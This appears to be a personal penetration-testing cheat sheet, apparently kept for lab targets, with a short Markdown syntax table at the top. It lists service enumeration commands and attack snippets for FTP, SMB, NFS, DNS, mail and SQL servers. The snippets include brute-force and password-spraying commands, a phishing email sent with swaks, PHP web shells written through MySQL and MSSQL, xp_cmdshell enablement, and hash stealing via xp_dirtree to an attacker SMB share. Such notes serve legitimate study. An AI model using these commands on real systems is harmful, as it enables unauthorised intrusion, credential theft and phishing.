| Element | Markdown Syntax |
|----------|----------------|
| Heading | #H1 |
|        | ##H2 |
|         | ###H3 |
| Bold | **bold** |
| Italic |  *Italic* |
| Blockquote | > blockquote |
| Ordered List | 1. First Item <br> 2. Second Item |
|Unordered List |- First Item <br> - Second Item|
|Code |`code`|
|Horizontal Rule |---|
| Link | [title](http://example.com)|
| Image | ! [alt text](image.jpg) |
| Fenced code Block | ``` <br> { <br>   "firstName": "John", <br>   "lastName": "Smith", <br>   "age": 25 <br> }| 
| Footnote	| Here's a sentence with a footnote. [^1]<br>[^1]: This is the footnote.|
|Heading ID	|### My Great Heading {#custom-id}|
|Definition List	|term<br>: definition|
| Strikethrough	|~~The world is flat.~~ |
 |Task List | 	<br> - [x] Write the press release <br>- [ ] Update the website <br> - [ ] Contact the media |
 | Emoji |	That is so funny! :joy: |
|  Highlight |	I need to highlight these ==very important words==. |
| Subscript	 |H~2~O |
 | Superscript |	X^2^|



# Enumeration
```
sudo nmap --script-updatedb
```
Scan network range 
```
sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
```
Start with nmap scan
```
nmap -A -sC -sV -p- <IP>
```
Then scan UDP ports
```
sudo nmap -A -sC -sV -p- -sU <IP>
```

Next continue with the Open services

## FTP
Anonymous login
```
ftp 10.129.14.136
```
Can enable *trace* and *debug* after connecting
<br>
Footprinting
```
find / -type f -name ftp* 2>/dev/null | grep scripts
sudo nmap -sV -p21 -sC -A 10.129.14.136
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace # script trace
```

Encrypted FTP
```
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```
Brute Forcing with Medusa
```
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```
FTP Bounce Attack
```
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

## SMB

### Footprinting the service
```
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

### SMBclient - Connecting to the Share
```
smbclient -N -L //10.129.14.128
smbclient //10.129.14.128/notes
```

### Connecting to Share

```
smbclient //10.129.14.128/notes -U john
```

### RPCclient
```
rpcclient -U "" 10.129.14.128
```
### RPCclient - Enumeration
```
> srvinfo
> enumdomains
> querydominfo
> netshareenumall
> netsharegetinfo notes
> querygroup <group_id>
```
### Bruteforcing User RIDs
```
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
```
samrdump.py 10.129.14.128
```
### SMBmap
```
smbmap -H 10.129.14.128
```
### CrackMapExec
```
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```
```
./enum4linux-ng.py 10.10.11.45 -A -C
```

## NFS

### Footprinting the Service
```
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```

### Show Available Shares
```
showmount -e 10.129.14.128
```
### Mount NFS Share
```
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NF
```

### Unmount 
```
sudo unmount ./target-NFS
```

## DNS
### Footprinting the Service
```
nmap -p53 -Pn -sV -sC 10.10.110.213
```

### SOA Record
```
dig soa www.inlanefreight.com
```
### NS Query
```
dig ns inlanefreight.htb @10.129.14.128
```
### Version Query
```
dig CH TXT version.bind 10.129.120.85
```
### Any Query
```
dig any inlanefreight.htb @10.129.14.128
```
### AXFR Zone Transfer
Sometimes actual domain doesn't allow zone transfer but sub domains allow it.
```
dig axfr inlanefreight.htb @10.129.14.128
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```
```
fierce --domain zonetransfer.me
```
### Subdomain Brute Forcing
```
for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```
```
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```
```
./subfinder -d inlanefreight.com -v
```
```
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
```
CNAME record
```
host support.inlanefreight.com
```
**Can use Ettercap or Bettercap to poison DNS Cache**

## SMTP, IMAP & POP3
### Host MX Records
```
host -t MX hackthebox.eu
```
### Footprinting the Service
```
sudo nmap 10.129.14.128 -sV -p25,110,143,993,995 -sC
```
### Nmap - Open Relay
```
sudo nmap 10.129.14.128 -p25 --script smt-open-relay -v
```
```
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```
### SMTP User Bruteforce

```
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```
### Cloud Bruteforce
```
python3 o365spray.py --validate --domain msplaintext.xyz
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```
### IMAP Commands
| Command	| Description	|
|----------|----------------|
| 1 LOGIN username password		| User's login.	| 
| 1 LIST "" *		| Lists all directories.	| 
| 1 CREATE "INBOX"		| Creates a mailbox with a specified name.	| 
| 1 DELETE "INBOX"		| Deletes a mailbox.	| 
| 1 RENAME "ToRead" "Important"		| Renames a mailbox.	| 
| 1 LSUB "" *	| 	Returns a subset of names from the set of names that the User has declared as being active or subscribed.	| 
| 1 SELECT INBOX		| Selects a mailbox so that messages in the mailbox can be accessed.	| 
| 1 UNSELECT INBOX		| Exits the selected mailbox.	| 
| 1 FETCH <ID> all		| Retrieves data associated with a message in the mailbox.	| 
| 1 CLOSE		| Removes all messages with the Deleted flag set.	| 
| 1 LOGOUT	| 	Closes the connection with the IMAP server.	| 

### POP3 Commands
| Command	| Description	|
|----------|----------------|
| USER username	| Identifies the user.| 
| PASS password	| Authentication of the user using its password.| 
| STAT	| Requests the number of saved emails from the server.| 
| LIST| 	Requests from the server the number and size of all emails.| 
| RETR | id	Requests the server to deliver the requested email by ID.| 
| DELE | id	Requests the server to delete the requested email by ID.| 
| CAPA	| Requests the server to display the server capabilities.| 
| RSET	| Requests the server to reset the transmitted information.| 
| QUIT	| Closes the connection with the POP3 server.| 

### cURL
```
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd -v
```
### OpenSSL POP3s & IMAPS
```
openssl s_client -connect 10.129.14.128:pop3s
openssl s_client -connect 10.129.14.128:imaps
```

### Password Spraying
```
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```
```
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## MySQL & M SSQL
### Footprinting the Service
```
sudo nmap 10.129.14.128 -sV -sC -p3306,1433 --script mysql*
```
### NMAP MSSQL Script Scan
```
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```
*Can use mssqlping in metasploit*
### Enumeration (Banner Grabbing)
```
nmap -Pn -sV -sC -p1433 10.10.10.125
```
### Intratcion with MySQL Server
```
mysql -u root -h 10.129.14.132
```
```
mysql -u root -pP4SSw0rd -h 10.129.14.128
```
### Intratcion with MSSQL Server
```
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
```
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```
```
mssqlclient.py -p 1433 julio@10.129.203.7
```
```
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```
| Command	| Description	|
|----------|----------------|
| mysql -u <user> -p<password> -h <IP address>	| Connect to the MySQL server. There should not be a space between the '-p' flag, and the password. | 
| show databases;	| Show all databases. | 
| use <database>;	| Select one of the existing databases. | 
| show tables;	| Show all available tables in the selected database. | 
| show columns from <table>;	| Show all columns in the selected database. | 
| select * from <table>;	| Show everything in the desired table. | 
| select * from <table> where <column> = "<string>";	| Search for needed string in the desired table. | 

**Many other clients can be used to access a database running on MSSQL. Including but not limited to:**
mssql-cli,	SQL Server PowerShell,	HediSQL,	SQLPro,	Impacket's mssqlclient.py

### Connecting with mssqlclient.py
```
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

### MSSQL Commands
```
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```
```
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```
```
1> xp_cmdshell 'whoami'
2> GO
```
If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```
### MySQL - Write Local File

```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

### MySQL - Secure File Privileges
```
show variables like "secure_file_priv";
```

### MSSQL - Enable Ole Automation Procedures
```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
### MSSQL - Create a File
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
### Read Local Files in MSSQL
```
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```
### MySQL - Read Local Files in MySQL
```
select LOAD_FILE("/etc/passwd");
```
### Capture MSSQL Service Hash
XP_DIRTREE Hash Stealing
```
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```
XP_SUBDIRS Hash Stealing
```
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```
XP_SUBDIRS Hash Stealing with Responder
```
sudo responder -I tun0
```
XP_SUBDIRS Hash Stealing with impacket
```
sudo impacket-smbserver share ./ -smb2support
```
### Impersonate Existing Users with MSSQL
Identify Users that We Can Impersonate
```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```
Verifying our Current User and Role
```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```
Impersonating the SA User
```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```
### Communicate with Other Databases with MSSQL
Identify linked Servers in MSSQL
```
1> SELECT srvname, isremote FROM sysservers
2> GO
```
```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

